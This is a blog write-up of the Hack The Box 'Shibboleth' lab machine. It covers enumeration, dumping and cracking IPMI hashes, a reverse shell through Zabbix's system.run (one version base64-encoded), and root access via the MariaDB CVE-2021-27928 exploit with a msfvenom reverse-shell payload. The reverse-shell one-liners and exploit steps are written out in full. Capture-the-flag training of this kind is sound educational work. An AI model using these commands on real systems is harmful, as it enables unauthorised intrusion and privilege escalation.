---
title: "Hack The Box - Shibboleth Walkthrough"
date: 2022-03-31T11:25:54+02:00
description: "Hack The Box Shibboleth Walkthrough/Write-Up"
featured: false
draft: false
toc: false
# menu: main
usePageBundles: false
featureImage: "/images/shibboleth_htb.png"
#featureImageAlt: 'Description of image'
#featureImageCap: 'This is the featured image.'
thumbnail: "/images/shibboleth_htb.png"
shareImage: "/images/shibboleth_htb.png"
codeMaxLines: 10
codeLineNumbers: false
figurePositionShow: true
categories:
  - Walkthroughs
tags:
  - Hack the Box
  - Linux
---
Today we will be taking a look at "Shibboleth" from Hack the Box. To get get a foothold onto the box we first exploit the vulnerable-by-design IPMI protocol to obtain an administrator hash for Zabbix, and crack it. Through Zabbix we can execute local commands and obtain a shell. We can then use a recent MariaDB privilege escalation exploit to escalate to the root user.

## Foothold
As always, we start off with a simple nmap scan to enumerate ports, services and version numbers.

```sh
nmap -sC -sV -oN shibboleth.htb
```

We only find one port open, which is port 80 HTTP. 

```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
|_http-title: FlexStart Bootstrap Template - Index
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Visiting the web page, we see it's a bootstrap template with lorem ipsum content, which doesn't provide us with any useful information. We look through the source code of the web page, but there's no hidden comments, directories or scripts that point out. Let's check for interesting web directories / files through Gobuster.

```sh
gobuster dir -u http://shibboleth.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster.out -x html
```

Gobuster provides us the following information.

```
/blog.html            (Status: 200) [Size: 19196]
/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/]
/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/]
/index.html           (Status: 200) [Size: 59474]
/server-status        (Status: 403) [Size: 279]
```

We check the directories, but don't find any new or interesting information. As we have no other services to enumerate, it seems like a good moment to start enumerating virtual hosts. For this we can either use a built-in nmap script or wfuzz. Let's try both and compare the results. We start off with nmap.

```sh
nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=shibboleth.htb 10.129.128.185
```

Which provides us with the following output.

```text
PORT   STATE SERVICE
80/tcp open  http
| http-vhosts: 
| 127 names had status 302
|_monitor.shibboleth.htb : 200
```

We see that nmap received 127 redirects, and one page with a 200 status code, indicating that monitor.shibboleth.htb is a valid subdomain. As nmap by default only enumerates 128 domains, we could use the "http-vhosts.filelist" argument to specify a custom wordlist. As I would also like to showcase wfuzz virtual host enumeration, I'll skip nmap and get straight into wfuzz. We issue the following command.

```sh
wfuzz -c -u http://shibboleth.htb/ -H "Host: FUZZ.shibboleth.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26 -f wfuzz.out
```

We specify the usage of colors with -c flag, enumerate host headers (which are used to indicate sub domains) by supplying the -H flag and hide any page containing 26 words to ensure we aren't getting any false positives. Wfuzz returns the following results.

```text
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000099:   200        29 L     219 W      3687 Ch     "monitor"                                                                                                                                                                 
000000346:   200        29 L     219 W      3687 Ch     "monitoring"                                                                                                                                                              
000000390:   200        29 L     219 W      3687 Ch     "zabbix"
```

Indicating that monitor.shibboleth.htb, monitoring.shibbolth.htb and zabbix.shibboleth.htb exist. We add these domains to our /etc/hosts file and visit them. All three pages greet us with a Zabbix login page. We attempt to login with default admin:zabbix credentials but no luck. 

Zabbix is an open source IT-infrastructure monitoring tool, often used in combination with remote access controllers such as Dell's Integrated Dell Remote Access Controller (iDRAC) or HP's Integrated Lights-Out (iLO) tools. These tools often leverage the intelligent platform management interface (IPMI) protocol over UDP to remotely administer hardware devices. IPMI by default runs on UDP port 623. We check to see if this port is open.

```sh
sudo nmap -sU -p 623 shibboleth.htb
```

As a sidenote, UDP nmap scans require root privileges because UDP doesn't inform users when a package is dropped (due to it's best effort nature), and therefore ICMP is required to test for open ports, which requires root privileges. We get the following results.

```text
PORT    STATE SERVICE
623/udp open  asf-rmcp
```

Indicating that UDP port 623 indeed is open. As the IPMI protocol has [built-in security flaws by default](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/), we can leverage this to get the hashes of known users. To utilize this flaw, we launch Metasploit and use the "auxiliary/scanner/ipmi/ipmi_dumphashes" module. We set the following options.

```sh
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set OUTPUT_HASHCAT_FILE hashes.txt
msf6 > set RHOSTS shibboleth.htb
msf6 > run
```

Which provides us with the following hash for the Administrator user.

```text
[+] 10.129.128.185:623 - IPMI - Hash found: Administrator:409e012f8201000096ed21758c10db6c69c431dd0097f02994c357198bd6f3e56f99c6613255d7bea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:fa695037a8d95e8ff81a2f5953ed974658972064
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now that we have the hash for the administrator user, we utilize hashcat to try and crack it. Hashcat doesn't automatically detect the hash that we provide, so we need to check the --example-hashes to figure out the correct hashcat mode. For this we issue the following command.

```sh
hashcat --example-hashes | grep -i "ipmi" -A 5 -B 1
```

By specifiying the -i flag we do an case insensitive search, and using the -A 5 and -B 1 we find the 5 lines after ipmi, and one line before ipmi, which shows us exactly the details that we need.

```text
Hash mode #7300
  Name................: IPMI2 RAKP HMAC-SHA1
  Category............: Network Protocol
  Slow.Hash...........: No
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
```

Hashcat doesn't expect the username in an IPMI hash by default, so we specify --username to ignore the username.

```sh
hashcat -m 7300 --username hashes.txt /usr/share/wordlists/rockyou.txt
```

After a while hashcat manages to crack the hash, and we obtain valid credentials. We try to use our newly found password to log into Zabbix, and we get in! As Zabbix is a remote IT-infrastructure monitoring tool, we can be sure that we can somehow leverage this platform to obtain local code execution. We navigate to Configuration --> Hosts --> items --> new item. We name our item "LCE", and specify the following key.

```sh
system.run[bash -i >& /dev/tcp/10.10.14.29/9001 0>&1]
```

We change the "Type of information" to text, and test the payload but it fails. I try to use several other payloads, but they all fail. It seems asif the system.run command does not like these special characters. To get rid of them I use base64 encoding like so.

```sh
system.run[echo -n L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI5LzkwMDEgMD4mMQ== | base64 -d | bash]
```

We obtain a reverse connection, but after clicking test, the process gets killed by Zabbix after a few seconds. To ensure persistence, we set up another listener on port 9002 and quickly initialize a second reverse shell during the few seconds of available connection. 

## Privilege Escalation
Now that we have our foothold as the zabbix user. We stabalize our shell, 

```sh
zabbix@shibboleth:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
kali@kali:~$ stty raw -echo
kali@kali:~$ fg
zabbix@shibboleth:~$ export TERM=xterm
```

We enumerate the box, and see that an ipmi-svc account is configured. We test for password reuse (based on the ipmi administrator password we just cracked), and manage to get onto the box as the ipmi-svc user.

```sh
zabbix@shibboleth:~$ su - ipmi-svc
>> whoami

ipmi-svc@shibboleth:~$ ipmi-svc
ipmi-svc@shibboleth:~$ ls
>> user.txt
```

Let's run linpeas, and analyze the results. After a while of enumerating different services, I found the following Linpeas information.

```text
mysql  Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2

/etc/zabbix/zabbix_server.conf:DBPassword=[...REDACTED...]
/etc/zabbix/zabbix_server.conf:DBUser=[...REDACTED...]
```

We see that MariaDB version 10.3.25 is running, and that Linpeas found some database credentials for us. When enumerating the service, we find out that this specific version is vulnerable for CVE-2021-27928. We leverage [the following PoC on GitHub](https://github.com/Al1ex/CVE-2021-27928) and follow the instructions. 

```sh
# Generate the shellcode
kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.29 LPORT=1337 -f elf-so -o CVE-2021-27928.so

# Set up a python web server
kali@kali:~$ python3 -m http.server 8080

# Copy the shellcode to the target system
ipmi-svc@shibboleth:~$ wget http://10.10.14.29:8080/CVE-2021-27928.so

# Set up a nc listener
kali@kali:~$ rlwrap nc -nvlp 1337
```

We copy the .so file to the /tmp directory, authenticate with the database using the obtained credentials and execute the .so file to obtain a reverse shell.

```sh
ipmi-svc@shibboleth:~$ cp CVE-2021-27928.so /tmp
ipmi-svc@shibboleth:~$ mysql -u zabbix -p -h localhost
ipmi-svc@shibboleth:~$ SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";

root@shibboleth:/root# whoami
>> root

root@shibboleth:/root# ls
>> root.txt
```

It took me a while to find out that the version of MariaDB is vulnerable. Next time it would be good to enumerate the database version, especially when credentials are available.

I hope you learnt something new from this box, and as always, thanks for reading and see you at the next one! 